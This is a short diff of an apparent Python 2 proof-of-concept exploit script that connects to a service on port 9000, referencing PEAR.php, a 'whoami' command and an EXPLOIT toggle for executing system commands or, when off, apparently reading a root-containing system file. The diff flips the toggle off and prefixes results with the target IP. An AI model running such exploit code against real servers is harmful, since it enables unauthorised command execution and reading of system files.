@@ -12,7 +12,7 @@ import socket
 
 PORT = 9000
 
-EXPLOIT = True  # set "True" to exec system commands
+EXPLOIT = False  # set "True" to exec system commands
 COMMAND = 'whoami'
 PHP_FILE_PATH = '/usr/share/php/PEAR.php'
 FLAG = randomString(10) if EXPLOIT else ':root:'
@@ -30,7 +30,7 @@ def poc(ip):
         sock.close()
 
         if ret.find(FLAG):
-            return ret.split(FLAG)[1] if EXPLOIT else True
+            return ip + ' -> ' +ret.split(FLAG)[1] if EXPLOIT else True
     except Exception, e:
         sock.close()
 
